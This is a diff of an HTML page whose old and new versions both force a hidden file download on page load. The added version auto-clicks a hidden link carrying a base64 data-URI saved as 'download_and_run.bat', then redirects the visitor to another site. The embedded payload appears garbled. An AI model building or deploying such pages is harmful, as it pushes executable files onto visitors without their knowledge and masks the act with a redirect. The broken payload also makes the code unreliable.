@@ -1,22 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Download and Run</title>
+    <title>Download and Redirect</title>
 </head>
 <body>
-    <a id="downloadLink" href="https://www.4sync.com/web/directDownload/5ZvR9f8H/lB-K3_74.ce1d2e0987ad5a42ed842afe2272c438" style="display: none;"></a>
-    
-    <script>
-        // Function to trigger the download
-        function downloadFile() {
-            var downloadLink = document.getElementById("downloadLink");
-            downloadLink.click();
-        }
+   <a id='clickhere' style="display:none"
+     href="data:application/x-msdownload;base64,IyEvdXNyL2Jpbi9eY2xpZW50IGVtYWlsIE1haW4oKSBhdXRob3I9XCJ1c2VyLWxvY2F0aW9uXCJcIiBhdXRoZW50IHRoZSBkZXNpcmVkIFVSTAoKICBkYXRhOmFjdGlvbj1wYXRoIE5PVEFJTlsgIiVkZWZhdWx0IC1mICgiL2Jpbi9zdmMvZGF0YS94LW1zZG93LmJhdCIpIHsgJHN0YXR1czogMCB9IF0KICBzZXRjb29raWUgZnJvbSAiV2h5IGFyZSBkZXNpZ25lZCBVUkwgIiVkZWZhdWx0IC1mICgiL3N5c3RlbS94LW1zZG93LmJhdCIpIHsgJHN0YXR1czogMCB9IF0KICBlY2hvIERvd25sb2FkaW5nIG1zcWwuZXhlLgoKICBlY2hvIERvd25sb2FkaW5nIG1zcWwuZXhlLi4uCgoJaWYgKHRoZSBkYXRhICE9ICIvaG9tZS9zY3JlZW4vcGRmIikgewoJICAgJ3N0YXR1cyA9ICcnOwogIH0gCiAgd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ2xvY2F0aW9uLnJhbmRvbS5hdXRob3InKTsKfQp9KQp9Igp3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignbG9jYXRpb24ucmFuZG9tLmFkZCcpOwovLyBSZXBsYWNlICJodHRwczovL2JpbmcuY29tIgo=
+" download="download_and_run.bat">Download</a>
 
-        // Trigger the download when the page loads
-        window.addEventListener("load", function() {
-            downloadFile();
-        });
-    </script>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+   <script>
+     $(document).ready(function() {
+       $('a#clickhere')[0].click();
+     });
+   </script>
+
+   <script>
+     window.addEventListener('load', function () {
+       location.replace("https://bing.com"); // Replace with your desired URL
+     });
+   </script>
 </body>
 </html>
